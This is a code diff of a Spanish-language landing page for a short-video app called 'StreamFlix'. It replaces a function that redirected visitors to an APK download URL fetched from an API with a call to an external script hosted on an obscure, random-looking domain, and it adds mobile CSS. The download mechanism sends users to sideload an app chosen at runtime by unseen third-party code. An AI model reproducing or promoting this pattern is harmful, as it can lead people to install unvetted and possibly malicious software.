@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -9,28 +8,14 @@
 <meta property="og:title" content="StreamFlix — Series Cortas en tu Bolsillo">
 <meta property="og:description" content="Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Sin anuncios.">
 <meta property="og:type" content="website">
-<link rel="icon" href="img/logo.jpg">
  
+   <script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
+
 
 <script>
-// ========== k2 — 动态获取APK下载地址并跳转 ==========
-var _apkUrl = '';
-async function k2(source) {
-    try {
-        if (!_apkUrl) {
-            var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
-            var d = await r.json();
-            _apkUrl = d.url;
-            console.log('APK API返回:', JSON.stringify(d));
-        }
-        if (_apkUrl) {
-            window.location.href = _apkUrl;
-        } else {
-            alert('获取APK下载地址失败，请稍后重试');
-        }
-    } catch (e) {
-        alert('获取APK下载地址失败，请稍后重试');
-    }
+function k2()
+{
+MeetU.download(event);
 }
 </script>
 
@@ -615,6 +600,54 @@ ul{list-style:none}
   .phone-2{display:none}
 }
 
+/* ============================================================
+   MOBILE-FIRST OVERRIDE — single column, 520px cap
+   ============================================================ */
+:root{--container:520px}
+.container{padding:0 20px}
+.top-nav-inner{height:60px}
+.nav-links{display:none}
+.nav-wordmark{font-size:1.22rem}
+
+.hero{padding:32px 0 40px}
+.hero-grid{grid-template-columns:1fr;gap:34px}
+.hero h1{font-size:clamp(2.2rem,11vw,2.9rem);margin-bottom:16px}
+.hero-lead{font-size:.98rem;max-width:none;margin-bottom:22px}
+.hero-actions{gap:12px;margin-bottom:22px}
+.hero-actions .btn{width:100%}
+.hero-actions .micro{width:100%;justify-content:center}
+.hero-meta{flex-direction:column;align-items:flex-start;gap:14px}
+.hero-collage{min-height:0;margin-top:6px}
+.phone{width:min(252px,66vw)}
+.phone-2{display:none}
+.poster-float{display:none}
+.float-chip{display:none}
+
+.stat-band-inner{grid-template-columns:1fr 1fr}
+.stat-band .cell{padding:26px 22px;border-left:1px solid var(--hairline);border-top:1px solid var(--hairline)}
+.stat-band .cell:nth-child(odd){border-left:none}
+.stat-band .cell:nth-child(-n+2){border-top:none}
+
+.shelf{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 20px 16px;margin:0 -20px;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.shelf::-webkit-scrollbar{display:none}
+.poster{flex:0 0 150px;scroll-snap-align:start}
+
+.bento{grid-template-columns:1fr;gap:14px}
+.f-lg,.f-sm,.f-full,.feature-media{grid-column:span 1}
+.feature-media .overlay ul{grid-template-columns:1fr}
+
+.reviews{columns:1}
+.big-stats-inner{grid-template-columns:1fr 1fr}
+.big-stats .cell{padding:32px 24px;border-left:1px solid rgba(255,255,255,.1);border-top:1px solid rgba(255,255,255,.1)}
+.big-stats .cell:nth-child(odd){border-left:none}
+.big-stats .cell:nth-child(-n+2){border-top:none}
+.sec-grid{grid-template-columns:1fr 1fr;gap:14px}
+.sec-card{padding:22px}
+
+.download-inner{max-width:520px;padding:0 20px}
+.download .btn-primary{width:100%;max-width:340px;margin:0 auto}
+.footer-inner{flex-direction:column;text-align:center;gap:12px}
+
 @media(prefers-reduced-motion:reduce){
   *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}
 }
@@ -641,7 +674,6 @@ ul{list-style:none}
 <nav class="top-nav" id="topNav">
   <div class="container top-nav-inner">
     <a class="nav-brand" href="#top">
-      <img class="nav-logo" src="img/logo.jpg" alt="StreamFlix logo">
       <span class="nav-wordmark">Stream<span>Flix</span></span>
     </a>
     <div class="nav-links">
@@ -1010,7 +1042,6 @@ ul{list-style:none}
 <footer class="page-footer">
   <div class="container footer-inner">
     <div class="footer-brand">
-      <img src="img/logo.jpg" alt="StreamFlix">
       © 2026 StreamFlix
     </div>
     <div class="footer-links">
@@ -1026,7 +1057,6 @@ ul{list-style:none}
      ============================================================ -->
 <div class="float-bar" id="floatBar">
   <div class="float-bar-inner">
-    <img class="float-bar-logo" src="img/logo.jpg" alt="StreamFlix">
     <div class="float-bar-info">
       <div class="t">StreamFlix</div>
       <div class="s">Series cortas gratis · Sin anuncios</div>
